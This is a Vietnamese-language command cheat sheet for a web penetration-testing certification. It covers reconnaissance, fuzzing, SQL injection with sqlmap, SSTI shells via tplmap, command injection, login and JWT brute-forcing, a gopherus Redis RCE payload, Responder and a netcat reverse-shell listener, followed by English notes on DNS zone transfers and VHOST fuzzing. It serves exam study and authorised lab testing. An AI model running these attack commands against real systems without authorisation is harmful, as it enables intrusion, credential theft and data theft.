# HTB CWES (CBBH) Command Cheat Sheet

Đây là bản tóm tắt các công cụ dòng lệnh (CLI) cốt lõi phục vụ cho việc rà quét, tấn công và leo quyền trong kỳ thi HTB Certified Web Exploitation Specialist.

## 1. Reconnaissance & Enumeration (Rà quét & Thu thập thông tin)

### Nmap (Quét cổng và dịch vụ)
```bash
# Quét toàn bộ cổng, dò phiên bản dịch vụ và chạy script mặc định
nmap -p- -sV -sC -Pn <TARGET_IP>
```

### WhatWeb (Nhận diện công nghệ nền tảng)
```bash
# Quét chuyên sâu mức độ 3 để nhận diện Tech Stack
whatweb -a 3 http://<TARGET_IP>
```

### WPScan (Quét lỗ hổng WordPress - Cực kỳ phổ biến trong HTB)
```bash
# Liệt kê người dùng (u), plugin lỗi (vp), theme lỗi (vt)
wpscan --url http://<TARGET_IP> --enumerate u,vp,vt --api-token <YOUR_TOKEN>
```

## 2. Fuzzing & Discovery (Dò tìm tự động)

### FFUF (Fuzzing Thư mục, VHost, Tham số)
```bash
# Dò tìm thư mục/file ẩn
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://<TARGET_IP>/FUZZ -mc 200,301,302

# Dò tìm Virtual Host (VHost) - Lọc bỏ các trang lỗi có size cố định (-fs)
ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u http://<TARGET_DOMAIN> -H "Host: FUZZ.<TARGET_DOMAIN>" -fs 42

# Dò tìm tham số (Parameter) cho GET Request
ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/burp-parameter-names.txt -u http://<TARGET_IP>/api/users?FUZZ=test
```

### Gobuster (Dò VHost thay thế ổn định)
```bash
gobuster vhost -u http://<TARGET_DOMAIN> -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain
```

### Feroxbuster (Dò tìm thư mục đệ quy cực nhanh bằng Rust)
```bash
# Dò tìm đệ quy (tự động quét tiếp vào các thư mục tìm thấy) và tìm các file có đuôi cụ thể
feroxbuster -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt -x php,html,txt,bak
```

### Kiterunner (Dò tìm API Endpoints chuyên sâu)
```bash
kr scan http://<TARGET_IP>/api -w /opt/kiterunner/routes-large.kite
```

### Arjun (Tìm kiếm tham số ẩn trên API/Web)
```bash
# Tự động dò tìm các tham số GET hoặc POST chưa được công bố trên API endpoint
arjun -u http://<TARGET_IP>/api/endpoint -m GET
```

## 3. Web & API Interaction (Tương tác Web/API)

### cURL (Gửi HTTP Request)
```bash
# Gửi POST request dạng JSON kèm Token xác thực, bỏ qua lỗi SSL (-k)
curl -i -s -k -X POST -H "Content-Type: application/json" -H "Authorization: Bearer <TOKEN>" -d '{"username":"admin", "password":"123"}' http://<TARGET_IP>/api/login
```

## 4. Exploitation Tools (Công cụ khai thác chuyên sâu)

### SQLMap (Tấn công SQL Injection)
```bash
# Khai thác cơ bản từ URL
sqlmap -u "http://<TARGET_IP>/product.php?id=1" --batch --dbs

# Khai thác thông qua file request lưu từ Burp Suite (tập trung vào tham số username)
sqlmap -r req.txt -p username --level 3 --risk 2 --dbms=postgresql
```

### Dalfox (Tự động hóa quét XSS)
```bash
dalfox url "http://<TARGET_IP>/search?q=test"
```

### Tplmap (Tấn công Server-Side Template Injection - SSTI)
```bash
# Khai thác SSTI và lấy thẳng OS Shell
tplmap.py -u "http://<TARGET_IP>/page?name=*" --os-shell
```

### Commix (Tấn công OS Command Injection)
```bash
# Tự động hóa quá trình tìm kiếm và chèn mã thực thi lệnh hệ điều hành
commix --url="http://<TARGET_IP>/ping.php?ip=127.0.0.1" --os-cmd="id"
```

### jwt_tool (Tấn công JSON Web Tokens)
```bash
# Chạy toàn bộ kịch bản tấn công cơ bản (Playbook)
python3 jwt_tool.py <TOKEN> -M pb

# Brute-force bẻ khóa Secret Key của JWT
python3 jwt_tool.py <TOKEN> -C -d /usr/share/wordlists/rockyou.txt
```

### Gopherus (Khai thác SSRF qua các dịch vụ nội bộ)
```bash
# Tạo payload gopher:// để khai thác RCE qua Redis nội bộ
gopherus --exploit redis
```

### Hydra (Brute-force Form Đăng nhập Web)
```bash
# Brute-force POST Form dựa trên thông báo lỗi "Incorrect"
hydra -l admin -P /usr/share/wordlists/rockyou.txt <TARGET_IP> http-post-form "/login.php:user=^USER^&pass=^PASS^:F=Incorrect"
```

### Nuclei (Quét lỗ hổng dựa trên Template)
```bash
nuclei -u http://<TARGET_IP> -tags cve,lfi,ssrf
```

## 5. Post-Exploitation & Data Extraction (Hậu khai thác & Trích xuất dữ liệu)

### CeWL (Tạo từ điển tùy chỉnh)
```bash
# Cào từ vựng trên web mục tiêu để tạo wordlist (chiều sâu 2, từ dài tối thiểu 5 ký tự)
cewl -d 2 -m 5 -w custom_wordlist.txt http://<TARGET_IP>
```

### Hashcat (Bẻ khóa mật khẩu)
```bash
# Bẻ khóa hash bằng wordlist (Ví dụ: -m 3200 cho Bcrypt, -m 0 cho MD5)
hashcat -a 0 -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
```

### GitTools (Khôi phục mã nguồn bị rò rỉ)
```bash
# Tải toàn bộ thư mục .git đang mở public
bash gitdumper.sh http://<TARGET_IP>/.git/ dest_folder

# Trích xuất commit thành mã nguồn hoàn chỉnh
bash extractor.sh dest_folder dest_repo
```

### Responder (Bắt NTLM Hash qua SSRF/LFI)
```bash
responder -I tun0 -rdw
```

### Netcat (Lắng nghe kết nối Reverse Shell)
```bash
# Mở cổng lắng nghe shell trả về
nc -lvnp 4444
```

### Check domain contractor
```bash
# whois [domain]
```

### Check domain info
```bash
# dig [domain/IP] [record (A/MX/...)
# dig +short [domain/IP]
```

### Check doamin mapped to IP (reversing)
```bash
# dig +x [IP]
```

### Subdomain bruteforcing
```bash
# dnsenum --enum [domain] -f  /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
```

# DNS Zone Transfers (AXFR)
## Defination
DNS Zone transfers is a wholesale copy of all DNS records within a zone (domain and its subdomains) from one name server to another for maintaining consistency and redundancy across DNS servers. There are 5 steps:
 1. secondary DNS name servers send a AXFR request to primary DNS server
 2. the primary server responses a SOA records to check data updated
 3. the primary server transfer sequentially DNS records like A, AAAA, MX, CNAME,...
 4. the primary server notifies the transfer accomplished
 5. the secondary server send a confirm package (ACK)

### Implementation
The Zone Transfer Vulnerability: is a DNS misconfiguration that allow anyone (instead of reliable servers) send an AXFR requests and fetch wholesale copy of all DNS records, the hackers can get all info about sudomains (stagging, production, dev,...), IP addresses, name servers information... by using `dig axfr` cmd
```bash
# dig axfr @[nameserver IP/domain] [target IP]
```
ex:
```bash
# dig axfr @nsztm1.digi.ninja zonetransfer.me
```
## Remediation
Configurate the DNS servers that only allows strictly requests from a whitelist of trusted servers 

# Virtual Host (VHOST)
## Defination
VHOST is a configuration on Web servers (Apache, Nginx, IIS,...) allows multi website/applications running on only 1 IP address. Website will rely on HTTP Host Header in request to know exactly IP address target, then redirect to DocumentRoot (eg. /var/www/html). VHOST doesn't have DNS public records, whereas subdomain does. VHOST can only access internally by configuration via hosts file. There are some type of VHOST:
 1. Name-Based: use the samne IP, distinguish by Host Header.
 2. IP-Based: each webiste has its own IP address.
 3. Port-Based: use identical IP address, but has own port service (ex: port 80, 8080, 3000...)
## Tools (VHOST Fuzzing)
 - Gobuster
   ```bash
   # gobuster vhost -u http://<Target_IP> --domain <domain_name> -w <Path_to_Wordlist> --append-domain
   ex:
   # gobuster vhost -u http://1.2.3.4 --domain test.test -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain [-o output.txt]
   ```
 - Forexbuster
 - ffuf
   ```bash
   # ffuf -u http://94.237.57.211:46627 \
     -H "Host: FUZZ.<domain>" \
     -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt \
     -fs 116
   ```
